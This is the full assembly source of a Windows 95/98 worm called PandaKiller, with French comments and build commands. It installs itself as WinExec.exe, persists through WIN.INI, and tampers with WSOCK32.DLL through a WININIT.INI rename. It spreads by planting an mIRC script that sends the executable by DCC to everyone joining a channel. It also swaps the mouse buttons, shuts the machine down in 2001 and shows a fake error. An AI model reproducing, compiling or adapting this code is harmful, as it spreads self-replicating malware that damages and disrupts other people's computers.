comment $
                ***   **  *  * ***   **   *  * * *    *    **** ***
                *  * *  * ** * *  * *  *  * *  * *    *    *    *  *
                *  * *  * ** * *  * *  *  **   * *    *    **   *  *
                * *  **** * ** *  * ****  **   * *    *    *    ***
                *    *  * * ** *  * *  *  * *  * *    *    *    * *
                *    *  * *  * ***  *  *  *  * * **** **** **** *  *

             W95/98.PandaKiller par PandaKiller le 1er novembre 2000

POUR COMPILER:

tasm32 /M /ML ?????.asm
tlink32 -Tpe -x -aa ?????.obj,,,import32

$

.386
jumps
locals
.model flat, stdcall

;KERNEL32.dll
extrn lstrcat:PROC
extrn WritePrivateProfileStringA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn CreateFileA:PROC
extrn DeleteFileA:PROC
extrn ExitProcess:PROC
extrn CloseHandle:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC
extrn Sleep:PROC
extrn WinExec:PROC
extrn WriteFile:PROC
extrn GetSystemTime:PROC

;USER32.dll
extrn MessageBoxA:PROC
extrn SwapMouseButton:PROC
extrn ExitWindowsEx:PROC
extrn GetVersionExA:PROC

;ADVAPI32.dll
extrn RegCreateKeyExA:PROC
extrn RegCloseKey:PROC

.data
szOrig  db 260 dup (0)
szCopie db 260 dup (0)
szWsk1  db 260 dup (0)
szWsk2  db 260 dup (0)
szWin   db 260 dup (0)
szWin2  db 260 dup (0)
fh      dd 0
octets  dd 0
regDisp	dd 0
regResu	dd 0
Copie   db "\WinExec.exe",00h
Wsk1    db "\WSOCK32.DLL",00h
Wsk2    db "\WSOCK32.TPK",00h
Wininit db "\\WININIT.INI",00h
windows db "windows",00h
run     db "run",00h
Winini  db "\\WIN.INI",00h
nul     db "NUL",00h
rename  db "Rename",00h
ini     db "C:\script.tpk",00h
script1 db "C:\mirc\script.ini",00h
script2 db "C:\mirc32\script.ini",00h
script3 db "C:\program files\mirc\script.ini",00h
script4 db "C:\program files\mirc32\script.ini",00h
CLE	db "Software\[PandaKiller]",00h
TITRE   db "Error Loader",00h
TEXTE   db "Windows NT required !",0dh,0ah
        db "This program will be terminated",00h

inid    db "[script]",0dh,0ah
        db "n0=on 1:start:{",0dh,0ah
        db "n1=.remote on",0dh,0ah
        db "n2=.ctcps on",0dh,0ah
	db "n3= .events on",0dh,0ah
	db "n4=}",0dh,0ah
	db "n5=on 1:join:#:{",0dh,0ah
	db "n6= if ( $nick == $me ) { halt } | .dcc "
        db "send $nick C:\Windows\WinExec.exe",0dh,0ah
	db "n7=}",0dh,0ah
initaille equ $-inid

SYSTIME struct
wYear           WORD ?
wMonth          WORD ?
wDayOfWeek      WORD ?
wDay            WORD ?
wHour           WORD ?
wMinute         WORD ?
wsecond         WORD ?
wMilliseconds   WORD ?
SYSTIME ends
SystemTime SYSTIME <>

.code
DEBUT:  mov  eax, offset CLE            ; V‚rifie si il existe une cl‚
        call REG                        ; [PandaKiller] dans HKLM\Software.
        cmp  [regDisp],1                ; Si elle n'y est pas, 
        jne  FICHIER                    ; il installe les composants

WCOPIE: push 0                          ;
        call GetModuleHandleA           ;
        push 260                        ; Le programme se copie dans le 
        push offset szOrig              ;
        push eax                        ;
        call GetModuleFileNameA         ; dossier WINDOWS de l'ordinateur
        push 260                        ;
        push offset szCopie             ; et se nommera WinExec.exe
        call GetWindowsDirectoryA       ;
        push offset Copie               ;
        push offset szCopie             ;
        call lstrcat                    ;
        push 0                          ;
        push offset szCopie             ;
        push offset szOrig              ;
        call CopyFileA                  ;

WIN_INI:push 260                        ; On met dans le fichier WIN.INI
        push offset szWin2              ; une routine pour que le programme
        call GetWindowsDirectoryA       ; s'active … chaque d‚marrage.
        push offset Winini              ; Cela ‚vite d'utiliser la BASE DE
        push offset szWin2              ; REGISTRE trop voyante.
        call lstrcat                    ; 
        push offset szWin2              ; Dans WIN.INI du dossier WINDOWS
        push offset szCopie             ; "nom du programme"
        push offset run                 ; run=
        push offset windows             ; [windows]
        call WritePrivateProfileStringA ;
                                        
WSOCK32:push 260                        ;
        push offset szWsk1              ; Ici, on copie le fichier du 
        call GetSystemDirectoryA        ; r‚pertoire SYSTEM, WSOCK32.DLL
        push 260                        ; 
        push offset szWsk2              ; en WSOCK32.TPK dans le mˆme
        call GetSystemDirectoryA        ; r‚pertoire SYSTEM
        push offset Wsk1                ;
        push offset szWsk1              ;
        call lstrcat                    ;
        push offset Wsk2                ;
        push offset szWsk2              ;
        call lstrcat                    ;
        push 0                          ;
        push offset szWsk2              ;
        push offset szWsk1              ;
        call CopyFileA                  ;
WININIT:push 260                        ; Pour que l'ordinateur puisse
        push offset szWin               ; utiliser le nouveau fichier
        call GetWindowsDirectoryA       ; WSOCK32.TPK, on va ‚crire dans
        push offset Wininit             ; le fichier WININIT.INI dans le
        push offset szWin               ; r‚pertoire WNDOWS.
        call lstrcat                    ; La routine est simple :
        push offset szWin               ; 
        push offset szWsk1              ; 
        push offset nul                 ; 
        push offset rename              ; [Rename]
        call WritePrivateProfileStringA ; NUL=%system%\WSOCK32.DLL
        push offset szWin               ;
        push offset szWsk2              ;
        push offset szWsk1              ;
        push offset rename              ;
        call WritePrivateProfileStringA ; %sys%\WSOCK32.DLL=%sys%\WSOCK32.TPK
        jmp  FICHIER

REG:    push offset regDisp             ;
     	push offset regResu		;
     	push 0         			; default security descriptor
     	push 0F003FH   			; KEY_ALL_ACCESS
     	push 0         			; 
     	push 0				;
     	push 0				;
     	push eax       			; adresse de la sous-CLE
     	push 80000002h 			; HKEY_LOCAL_MACHINE 
     	call RegCreateKeyExA		;
SUITE:  push [regResu]                  ; 
        call RegCloseKey                ;
        ret

FICHIER:push 00000000h                  ; Voila, un des moyens les plus
        push 00000080h                  ; pratique pour envoyer notre
        push 00000002h                  ; programme un peu partout.
        push 00000000h                  ;
        push 00000001h                  ; C'est mIRC. 
        push 40000000h                  ;
        push offset ini                 ; En utilisant un script, mIRC va 
        call CreateFileA                ; automatiquement envoyer notre 
        mov  [fh],eax                   ; programme … tous ceux qui se trouve
        push 00h                        ; dans le CHANNEL de la victime.
        push offset octets              ;
        push initaille                  ; Pour cela, on va ‚crire le script
        push offset inid                ; dans le dossier C:\
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;
                                        
COPIE:  push 00000000h                  ; Puis on va le copier dans les
        push offset script1             ; dossier suivant :
        push offset ini                 ;
        call CopyFileA                  ; C:\mirc
        push 00000000h                  ;
        push offset script2             ;
        push offset ini                 ;
        call CopyFileA                  ; C:\mirc32
        push 00000000h                  ;
        push offset script3             ;
        push offset ini                 ;
        call CopyFileA                  ; C:\program files\mirc
        push 00000000h                  ;
        push offset script4             ;
        push offset ini                 ;
        call CopyFileA                  ; C:\program files\mirc32
        push 00h                        ;
        push offset ini                 ;
        call DeleteFileA                ; Puis efface l'original.

ATTEND: push 60 * 1 * 1000              ; 
        call Sleep                      ; Fait une pause de 1 minute.

SOURIS: push 01h                        ;
        call SwapMouseButton            ; Modifie les boutons de la souris.

HEURE2: push offset SystemTime          ;
        call GetSystemTime              ; Regarde la date du systˆme.
        cmp  [SystemTime.wYear],7D1h    ; Si nous ne sommes pas en l'an 2001,
        jne  ALERT                      ; il saute au label ALERT

ETEIND: push 01h                        ;
        call ExitWindowsEx              ; Sinon ‚teind l'ordinateur.

ALERT:  push 10h                        ;
        push offset TITRE               ; Affiche le faux message d'erreur.
        push offset TEXTE               ;
        push 0                          ;
        call MessageBoxA                ;

FIN:    push 0                          ; 
        call ExitProcess                ; Fin du Programme

end DEBUT
